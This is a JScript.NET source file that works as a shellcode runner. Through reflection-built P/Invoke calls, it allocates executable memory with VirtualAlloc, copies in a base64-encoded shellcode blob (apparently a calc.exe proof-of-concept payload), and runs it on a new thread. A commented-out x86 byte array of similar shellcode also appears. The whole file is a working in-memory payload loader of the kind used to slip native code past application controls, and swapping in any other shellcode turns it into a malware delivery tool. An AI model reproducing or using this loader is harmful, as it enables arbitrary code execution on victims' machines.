import System;
import System.Runtime.InteropServices;
import System.Reflection;
import System.Reflection.Emit;
import System.Runtime;
import System.Text;
 
//C:\Windows\Microsoft.NET\Framework\v2.0.50727\jsc.exe Shellcode.js
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe Shellcode.js
 
var MEM_COMMIT:uint = 0x1000;
var PAGE_EXECUTE_READWRITE:uint = 0x40;

 
function InvokeWin32(dllName:String, returnType:Type,
  methodName:String, parameterTypes:Type[], parameters:Object[])
{
  // Begin to build the dynamic assembly
  var domain = AppDomain.CurrentDomain;
  var name = new System.Reflection.AssemblyName('PInvokeAssembly');
  var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
  var module = assembly.DefineDynamicModule('PInvokeModule');
  var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit);
 
  // Define the actual P/Invoke method
  var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);
 
  // Apply the P/Invoke constructor
  var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType("System.String")]);
  var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);
  method.SetCustomAttribute(attr);
 
  // Create the temporary type, and invoke the method.
  var realType = type.CreateType();
  return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);
}
 
function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32")];
	var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect];
	
	//return InvokeWin32("kernel32.dll", Type.GetType("System.UInt32"), "VirtualAlloc", parameterTypes,  parameters );
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "VirtualAlloc", parameterTypes,  parameters );
}

function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.IntPtr"),Type.GetType("System.IntPtr"), Type.GetType("System.UInt32"), Type.GetType("System.UInt32") ];
	var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];
	
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "CreateThread", parameterTypes,  parameters );
}

function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.IntPtr"),Type.GetType("System.UInt32")];
	var parameters:Object[] = [handle, dwMiliseconds ];
	
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "WaitForSingleObject", parameterTypes,  parameters );
}

/*var shellcode:Byte[] = new Byte[193] 
	{
		'0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,	0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,	0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,	0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,	0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,	0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,	0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,	0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00'
	};
*/
	var shellcodestr:String = '/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=';
	var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);
	var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	
	Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
	var hThread:IntPtr = IntPtr.Zero;
	var threadId:UInt32 = 0;
// prepare data

	var pinfo:IntPtr = IntPtr.Zero;

// execute native code

	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId);
	WaitForSingleObject(hThread, 0xFFFFFFFF);

	